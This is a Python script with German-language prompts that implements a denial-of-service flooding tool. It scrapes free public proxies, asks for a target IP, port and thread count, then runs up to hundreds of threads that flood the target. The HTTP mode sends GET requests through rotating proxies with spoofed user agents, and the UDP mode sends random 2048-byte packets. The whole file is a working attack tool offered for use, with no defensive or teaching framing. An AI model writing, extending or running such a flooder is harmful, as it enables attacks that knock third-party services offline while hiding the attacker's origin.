import requests
import threading
import socket
import random
import time
import urllib.request

def get_proxies():
    try:
        response = urllib.request.urlopen('https://www.sslproxies.org/')
        proxies = []
        for line in response.read().decode().split('\n'):
            if '<td>' in line:
                ip = line.split('<td>')[1].split('</td>')[0]
                port = line.split('<td>')[2].split('</td>')[0]
                proxies.append(f"{ip}:{port}")
        return proxies[:10]
    except:
        return []

def get_user_input():
    try:
        target_ip = input("Ziel-IP-Adresse (Standard: 127.0.0.1): ") or "127.0.0.1"
        target_port = input("Ziel-Port (Standard: 80): ") or "80"
        target_port = int(target_port)
        attack_type = input("Angriffstyp (http/udp, Standard: http): ").lower() or "http"
        threads_count = input("Thread-Anzahl (Standard: 500): ") or "500"
        threads_count = int(threads_count)
        target_url = f"http://{target_ip}:{target_port}" if attack_type == "http" else None
        return target_ip, target_port, attack_type, threads_count, target_url
    except EOFError:
        return "127.0.0.1", 80, "http", 500, "http://127.0.0.1:80"

def http_flood(target_url, proxy_list):
    session = requests.Session()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]),
        "Cache-Control": "no-cache",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }
    while True:
        proxy = random.choice(proxy_list) if proxy_list else None
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        try:
            response = session.get(target_url, headers=headers, proxies=proxies, timeout=3)
            print(f"HTTP-Anfrage: Status {response.status_code} via {proxy or 'direkt'}")
        except requests.exceptions.RequestException:
            pass
        time.sleep(random.uniform(0.05, 0.5))

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while True:
        try:
            payload = random._urandom(2048)
            sock.sendto(payload, (target_ip, target_port))
            print(f"UDP-Paket an {target_ip}:{target_port}")
        except socket.error:
            pass
        time.sleep(random.uniform(0.01, 0.1))

def start_attack(attack_func, *args):
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=attack_func, args=args)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_ip, target_port, attack_type, threads_count, target_url = get_user_input()
    proxy_list = get_proxies() if attack_type == "http" else []
    print(f"Starte {attack_type.upper()}-Angriff auf {target_url or f'{target_ip}:{target_port}'} mit {len(proxy_list)} Proxies")
    try:
        if attack_type == "http":
            start_attack(http_flood, target_url, proxy_list)
        elif attack_type == "udp":
            start_attack(udp_flood, target_ip, target_port)
        else:
            print("Ungültiger Angriffstyp. Wähle 'http' oder 'udp'.")
    except KeyboardInterrupt:
        print("Angriff gestoppt.")
